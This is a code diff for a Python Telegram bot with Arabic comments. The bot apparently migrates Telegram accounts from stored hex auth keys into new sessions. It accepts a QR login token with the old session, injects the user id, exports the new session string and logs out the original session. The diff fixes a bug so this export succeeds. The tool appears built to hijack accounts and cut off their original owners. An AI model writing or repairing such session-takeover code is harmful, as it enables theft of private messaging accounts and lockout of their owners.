@@ -544,19 +544,6 @@ def handle_hex_login(message):
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
 async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
     """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (الترتيب الجديد والقراءة من القاعدة)"""
 
@@ -565,16 +552,16 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
     verify_b = None
 
     try:
-        # 1. استخراج السيرفر الصحيح والهاكس من قاعدة البيانات التي تم حفظها مسبقاً
+        # 1. استخراج السيرفر الصحيح والهاكس والآيدي من قاعدة البيانات
         conn = get_db_conn()
         c = conn.cursor()
-        c.execute("SELECT dc_id, hex_key FROM sessions WHERE id=?", (acc_id,))
+        c.execute("SELECT dc_id, hex_key, user_id FROM sessions WHERE id=?", (acc_id,))
         row = c.fetchone()
         conn.close()
 
-        # 🔥 الحل هنا: التأكد 100% أن الـ dc_id عبارة عن رقم صحيح (Integer) لتفادي انهيار struct.pack
         target_dc = int(row[0]) if row and row[0] else 2
         saved_hex = row[1] if row and len(row) > 1 else "UNKNOWN"
+        target_user_id = int(row[2]) if row and len(row) > 2 and row[2] else 9999
 
         if not client_a.is_connected:
             await client_a.connect()
@@ -619,7 +606,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         ) 
         
         await client_b.storage.open()
-        await client_b.storage.dc_id(target_dc) # سيقبلها الآن بكل تأكيد لأنها Int
+        await client_b.storage.dc_id(target_dc) 
         await client_b.storage.test_mode(False)
         await client_b.connect() 
 
@@ -634,7 +621,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             client_b = Client(f"cb_retry_{acc_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=B_DEVICE_MODEL)
             
             await client_b.storage.open()
-            await client_b.storage.dc_id(int(qr.dc_id)) # تأكيد تحويلها لرقم
+            await client_b.storage.dc_id(int(qr.dc_id))
             await client_b.storage.test_mode(False)
             await client_b.connect()
 
@@ -644,9 +631,29 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         if isinstance(qr, types.auth.LoginToken):
             await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
 
-            await asyncio.sleep(4) 
+            # 🔥 الحل الجذري لمشكلة required argument is not an integer
+            # يجب أن تطلب الجلسة الجديدة من السيرفر تحديث حالتها لتأكيد الدخول
+            # ثم نحقن الـ user_id بداخلها برمجياً لكي لا تفشل دالة التصدير
+            success_obj = None
+            for _ in range(5):
+                await asyncio.sleep(2)
+                try:
+                    res = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
+                    if isinstance(res, types.auth.LoginTokenSuccess):
+                        success_obj = res
+                        break
+                except Exception:
+                    pass
+            
+            if not success_obj:
+                raise Exception("Token accepted by A, but B did not receive LoginTokenSuccess.")
 
-            # 7. تصدير الجلسة B وفصلها للتحقق
+            # حقن الآيدي يدوياً في الجلسة الجديدة لتجنب انهيار التصدير
+            authorized_user_id = success_obj.authorization.user.id if hasattr(success_obj.authorization, 'user') else target_user_id
+            await client_b.storage.user_id(authorized_user_id)
+            await client_b.storage.is_bot(False)
+
+            # 7. تصدير الجلسة B وفصلها للتحقق (الآن ستنجح 100%)
             session_b_str = await client_b.export_session_string()
             await client_b.disconnect()
 
